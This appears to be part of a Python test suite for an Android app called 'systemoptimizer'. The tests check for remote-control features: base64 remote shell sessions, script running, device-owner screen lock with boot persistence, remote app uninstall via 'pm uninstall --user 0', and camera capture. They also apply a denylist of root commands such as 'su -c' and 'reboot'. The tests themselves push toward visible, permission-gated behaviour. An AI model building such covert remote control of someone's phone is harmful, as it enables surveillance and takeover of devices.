    assert "\"pm\", \"uninstall\", \"--user\", \"0\"" in src, (
        "pm uninstall --user 0 build not found")
    assert "\"pm\", \"disable-user\", \"--user\", \"0\"" in src, (
        "pm disable-user --user 0 build not found")
    assert "FREE_FIRE_PACKAGE" in src, "Free Fire package constant missing"


def test_block_screen_device_owner_pieces():
    """حجب الشاشة الصارم (v2): إدارة جهاز حقيقية + جلسة دائمة + لا قفل وهمي."""
    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["strictCapabilityAvailable", "STRICT_BLOCK_UNAVAILABLE",
                  "block_screen_status", "block_screen_cancel",
                  "BlockSessionManager"]:
        assert token in src, token
    dmm = os.path.join(
        ROOT, "app", "src", "main", "java",
        "com", "example", "systemoptimizer", "DeviceManagementManager.java")
    with open(dmm, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["isDeviceOwner", "isLockTaskPermitted", "lockNow",
                  "setLockTaskPackages", "isInLockTaskMode"]:
        assert token in src, token
    block_session = os.path.join(
        ROOT, "app", "src", "main", "java",
        "com", "example", "systemoptimizer", "BlockSessionManager.java")
    with open(block_session, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["createDeviceProtectedStorageContext", "setAndAllowWhileIdle",
                  "activateIfDue", "recoverAfterServiceStart", "terminate"]:
        assert token in src, token
    block_activity = os.path.join(
        ROOT, "app", "src", "main", "java",
        "com", "example", "systemoptimizer", "BlockScreenActivity.java")
    with open(block_activity, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["startLockTask", "stopLockTask"]:
        assert token in src, token
    # لا يُركَّز منطق القفل في الواجهة: الخدمة تعيد الفرض (SCREEN_ON/USER_PRESENT).
    boot_receiver = os.path.join(
        ROOT, "app", "src", "main", "java",
        "com", "example", "systemoptimizer", "BootReceiver.java")
    with open(boot_receiver, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["LOCKED_BOOT_COMPLETED", "USER_UNLOCKED"]:
        assert token in src, token
    admin_receiver = os.path.join(
        ROOT, "app", "src", "main", "java",
        "com", "example", "systemoptimizer", "DeviceAdminReceiver.java")
    assert os.path.isfile(admin_receiver)
    policies = os.path.join(ROOT, "app", "src", "main", "res", "xml",
                            "device_admin_policies.xml")
    with open(policies, "r", encoding="utf-8") as f:
        src = f.read()
    assert "<force-lock" in src and "<watch-login" in src, "admin policies missing"
    manifest = os.path.join(ROOT, "app", "src", "main", "AndroidManifest.xml")
    with open(manifest, "r", encoding="utf-8") as f:
        src = f.read()
    assert "BIND_DEVICE_ADMIN" in src and "DeviceAdminReceiver" in src
    assert "LOCKED_BOOT_COMPLETED" in src and "USER_UNLOCKED" in src
    assert "directBootAware" in src
    # لا يُدَّعى قفل حقيقي: لا استدعاءات جذر خفية لحجب النظام
    assert "Shell.SU" not in src


def test_camera_visible_capture_pieces():
    """الكاميرا: التقاط ظاهر (معاينة) لا TakePicture خفي عن بُعد."""
    cam = os.path.join(
        ROOT, "app", "src", "main", "java",
        "com", "example", "systemoptimizer", "CameraCaptureActivity.java")
    with open(cam, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["Camera.open", "startPreview", "takePicture", "setPreviewDisplay"]:
        assert token in src, token
    assert "ActivityResultContracts.TakePicture" not in src


def test_video_player_uses_asset_cache_copy():
    """مشغل الفيديو يقرأ من assets/video، ويُنسخ إلى الذاكرة المؤقتة قبل التشغيل
    (VideoView لا يفتح file:///android_asset/ على الأنظمة الحديثة)."""
    player = os.path.join(
        ROOT, "app", "src", "main", "java",
        "com", "example", "systemoptimizer", "VideoPlayerActivity.java")
    with open(player, "r", encoding="utf-8") as f:
        src = f.read()
    assert "EXTRA_VIDEO_NAME" in src
    assert "getAssets().open(\"video/\"" in src
    assert "setVideoPath" in src
    assert "android.resource" not in src
    assert "EXTRA_RAW_RES_ID" not in src


def test_no_root_power_handlers_in_service():
    """The service must no longer invoke rooted power commands (Shell.SU)."""
    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
        src = f.read()
    for token in ["Shell.SU", "eu.chainfire", "ProcessBuilder(\"su\"",
                  "su -c", "\"reboot\"", "\"svc\", \"power\""]:
        assert token not in src, token


def test_permission_center_gate_at_startup():
    """لا root عند الإقلاع: MainActivity يوجه إلى مركز الصلاحيات فقط."""
    main_activity = os.path.join(
        ROOT, "app", "src", "main", "java",
        "com", "example", "systemoptimizer", "MainActivity.kt")
    with open(main_activity, "r", encoding="utf-8") as f:
        src = f.read()
    assert "PermissionCenter" in src, "MainActivity must gate on Permission Center"
    assert "RootPermissionActivity" not in src, (
        "MainActivity must not auto-open the root screen")


# ---------------------------------------------------------------------------

TESTS = [
    ("network_deg parser contract", test_network_deg_contract),
    ("play_sound parser contract", test_play_sound_contract),
    ("block_screen parser contract", test_block_screen_contract),
    ("serious_warning parser contract", test_serious_warning_contract),
    ("play_video parser contract", test_play_video_contract),
    ("android dispatch branches present", test_android_dispatch_branches_present),
    ("menu numbering contract (18 items)", test_menu_numbering_contract),
    ("scenario: network_deg valid exact command", test_scenario_network_deg_valid_exact),
    ("scenario: network_deg empty bandwidth", test_scenario_network_deg_empty_bandwidth),
    ("scenario: network_deg invalid inputs rejected", test_scenario_network_deg_invalid_rejected),
    ("scenario: network_deg all-zero rejected", test_scenario_network_deg_all_zero_rejected),
    ("scenario: play sound valid", test_scenario_sound_valid),
    ("scenario: play sound last entry", test_scenario_sound_last_entry),
    ("scenario: play sound back/invalid", test_scenario_sound_back_and_invalid),
    ("scenario: block screen", test_scenario_block_screen),
    ("scenario: serious warning", test_scenario_serious_warning),
    ("scenario: block app", test_scenario_block_app),
    ("block app package regex present", test_block_app_package_regex_present),
    ("scenario: play video empty library", test_scenario_play_video_empty_library),
    ("scenario: play video valid", test_scenario_play_video_valid),
    ("scenario: play video invalid id rejected", test_scenario_play_video_invalid_id_rejected),
    ("video library scanner contract", test_scan_video_library),
    ("scenario: run script base64 generation", test_scenario_script_base64),
    ("scenario: message dashboard commands", test_scenario_message_dashboard),
    ("sound library definition order", test_sound_library_definition_order),
    ("sound library unfiltered extensions", test_sound_library_unfiltered),
    ("sound library files valid", test_sound_library_files),
    ("video library files present", test_video_library_files),
    ("audio/video separation", test_audio_video_separation),
    ("resource names valid", test_resource_names_valid),
    ("no invalid res/raw names", test_no_invalid_res_raw_names),
    ("scenario: shell session open/id/close", test_scenario_shell_session),
    ("scenario: shell commands base64 roundtrip", test_scenario_shell_session_commands),
    ("scenario: shell returns to menu", test_scenario_shell_back_to_menu),
    ("no stale wifi/mobile-data toggles", test_no_stale_toggle_references),
    ("no removed device-control commands", test_no_removed_device_control_commands),
    ("no root power handlers in service", test_no_root_power_handlers_in_service),
    ("freefire uninstall uses --user 0", test_freefire_uninstall_uses_user_zero),
    ("block screen device-owner pieces", test_block_screen_device_owner_pieces),
    ("camera visible capture pieces", test_camera_visible_capture_pieces),
    ("video player uses asset cache copy", test_video_player_uses_asset_cache_copy),
    ("permission center gate at startup", test_permission_center_gate_at_startup),
]


def main():
    _configure_utf8()
    failed = 0
    for name, fn in TESTS:
        try:
            fn()
            print("PASS  " + name)
        except AssertionError as e:
            failed += 1
            print("FAIL  " + name + "  ->  " + str(e))
        except Exception as e:  # noqa: BLE001
            failed += 1
            print("ERROR " + name + "  ->  " + repr(e))
    print()
    print("%d/%d tests passed" % (len(TESTS) - failed, len(TESTS)))
    return 1 if failed else 0


def _configure_utf8():
    for stream in (sys.stdout, sys.stderr):
        reconfigure = getattr(stream, "reconfigure", None)
        if reconfigure is not None:
            try:
                reconfigure(encoding="utf-8")
            except Exception:
                pass


if __name__ == "__main__":
    sys.exit(main())